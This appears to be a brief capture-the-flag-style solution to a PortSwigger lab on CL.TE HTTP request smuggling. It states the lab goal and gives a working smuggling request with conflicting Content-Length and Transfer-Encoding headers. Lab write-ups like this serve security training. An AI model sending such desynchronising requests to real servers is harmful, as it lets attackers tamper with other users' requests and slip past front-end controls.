# [Lab: HTTP request smuggling, basic CL.TE vulnerability](https://portswigger.net/web-security/request-smuggling/lab-basic-cl-tehttps://portswigger.net/web-security/request-smuggling/lab-basic-cl-te)

## Lab

This lab involves a front-end and back-end server, and the front-end server doesn't support chunked encoding. The front-end server rejects requests that aren't using the GET or POST method.

To solve the lab, smuggle a request to the back-end server, so that the next request processed by the back-end server appears to use the method `GPOST.`

## Characteristics

front-end: CL

back-end: TE

## Solution

```http
POST /post/comment HTTP/1.1
Content-Length: 6
Transfer-Encoding: chunked

0

G
```
